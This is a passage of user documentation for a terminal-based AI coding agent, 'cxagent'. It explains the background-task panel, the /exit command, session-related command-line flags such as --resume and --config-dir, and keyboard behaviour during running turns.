says so. `F7` again hides the column; `F3` switches back to info.

While the panel has the keyboard, `↑` `↓` choose a card and `Enter` opens it in a tab — so does a
double-click. The status bar shows `F7:Tasks`, with a count of running background commands and agents while any
run, and other session tabs' as `+N` (`Tasks 2+1`).

**The tab follows the output** as it is written, stops following when you scroll up, and starts again
at the bottom. **Kill** stops the job; **Copy to transcript** queues its last 8,192 characters to go
with your next message, without starting a turn — and if you send while a turn is running, the model
gets the copy but your message shows only what you typed. Closing the tab leaves the job running, as an agent's tab does.

When a background command or agent finishes while the session is idle, its notice starts a turn; a
finished agent's report is shown as one line, not drawn in full. The notice is a System note, not
something you typed.

The model has the same operations as `task_list`, `task_stop` and `task_output`, not as a `/tasks` it
can type — it already has tools for this, and a command that only led to "the model has no terminal to
run this in" would be a dead end. **The session agent may stop anything; a sub-agent may stop only its
own commands**, and is told who owns one when refused. A sub-agent never sees other sub-agents. There is no permission prompt on a kill: the command was already
approved once, when it was backgrounded.

---

## `/exit`

Quits, and marks the session finished. It is still listed by `/sessions`, still opens by id, and is
still what `-c` continues if it is the most recent one here.

**On the way out it prints how to come back:**

```
Resume this session:  cxagent --resume 5ZFAVZ
```

That is the one moment the id is worth something — everywhere else it is an implementation detail,
and here it turns "I closed that by accident" into a command you can paste. It is skipped for a
session where nothing was said, since nothing was stored to come back to.

A session that ends any other way — a crash, a kill — stays **unfinished**, which is what the
startup line mentions by name.

**Nothing is offered on startup.** Earlier versions asked *"an earlier session ended without closing
— resume it?"* on the first render, before you had typed anything. It asked at the worst moment,
could only ever offer one session, and made resume something that happened *to* you. Now a grey line
says what is there:

```
An earlier session here ended without closing (13 messages). /sessions to see it — 4 in this folder.
```

---

## From the shell

Three flags that concern sessions, alongside `--mock`, `--mode <single|fan-out>` and
`--config-dir`.

```bash
cxagent --version               # print the version and exit
cxagent --model claude          # start on a configured instance, without editing config
cxagent --config-dir /tmp/x     # use this directory instead of the usual one
cxagent --sessions              # print this folder's sessions and exit
cxagent --sessions all          # every folder
cxagent -c                      # continue the most recent session here
cxagent -r 5ZFAVZ               # continue that one, by id or any unambiguous abbreviation
cxagent --resume                # start with this folder's sessions listed, to pick from
cxagent -p "<goal>"             # one goal, no TUI — see SCRIPTING.md
```

The options follow Claude Code's names (`-c`/`--continue`, `-r`/`--resume`, `-p`/`--print`), so
what works for `claude` works here.

**`--config-dir` takes the directory itself**, with no `cxagent` folder appended — unlike
`XDG_CONFIG_HOME`, which does append one. So `--config-dir /tmp/x` reads `/tmp/x/config.json` and
puts the session database and logs beside it. It overrides `XDG_CONFIG_HOME` when both are set,
because a path typed on the command line is the more specific instruction.

It is the quickest way to try something against a clean setup without touching your own — including
first-run behaviour, which is otherwise awkward to reach once you have a working config. A bare
`--config-dir` with no path is an error rather than a silent fall back to the usual directory: the
flag exists to keep a run AWAY from that directory, so quietly using it would be the one wrong answer.

**`--sessions` prints and exits — no TUI, no provider, no turn.** "Which conversations do I have
here" is a question you answer by looking, and making someone launch a full-screen app to read a list
is the kind of friction that stops people looking. Output is tab-separated with the **full** id, so
`cxagent --sessions | cut -f1` does what you expect:

```
5ZFAVZHZYPHHAWC501KZXEBFY1	2026-08-13 14:33	18213	add the arity table
```

**Four requests, and they are different.** With none of them a new session starts. `-c` continues the most recent
session *in this folder* — finished or not, skipping one already continued. `-r ID` continues that
one specifically; an id is **not** folder-scoped — copying one out of `--sessions all` and pasting it
here opens it, because naming a session is an explicit act. A bare `--resume` asks to pick: the TUI
starts with this folder's sessions listed, and `/sessions resume N` opens one.

**A resume that finds nothing still starts the TUI.** It says what went wrong — nothing to continue,
or an id that matched several — and begins a new session rather than refusing to launch. (A headless
`-c -p` that finds nothing is a usage error instead: a script must not silently start fresh.) An
unnoticed fresh start is how someone spends a turn wondering why the agent forgot everything.

`--sessions` with `-c` or `--resume` is an error: one asks a question, the other starts work, and
doing half of what was typed leaves no way to tell which half you got.

---

## Not commands

**Escape** stops a running turn. Anything queued goes back into the composer rather than being
discarded — it was never sent, so stopping must not eat what you typed. In btw mode it stops the
aside's answer instead, then leaves btw mode — see [`/btw`](#btw).

**Enter during a running turn** queues the message rather than starting a second one. Several queued
messages are joined into one prompt, newline-separated, and sent when the turn ends. They are
appended rather than replaced: two messages typed in succession are usually one thought completed,
and keeping only the last would silently discard half of what you said.

**A custom command typed during a running turn** waits instead of joining it. It shows as a
*held* row and runs as its own turn when the running one ends, expanded then, so a ``!`git diff` ``
inside it sees the changes the turn just made. One waits at a time: a second replaces the first and
says which. Escape hands it back to the composer — unless you had also typed text into the turn, in
which case that text comes back, since the composer takes one thing, and the command is named as not
run.

**A question from the model** takes over the composer, one question at a time. `↑↓` and `Enter`
choose an option — the first is already highlighted, so a recommended answer is one keypress — or
type your own. `Space` checks when several answers are allowed. With more than one question you get
a step indicator, `Alt+←` to go back, and a summary of every answer before any of it is sent.
`Esc` skips: answers already given are kept, and a skipped question tells the model to decide.

**F3** cycles the session panel — shown, hidden, automatic. It carries context occupancy, spend,
session id, MCP servers, configured agent types, and granted permissions. Spend appears per model
when more than one model has been used.
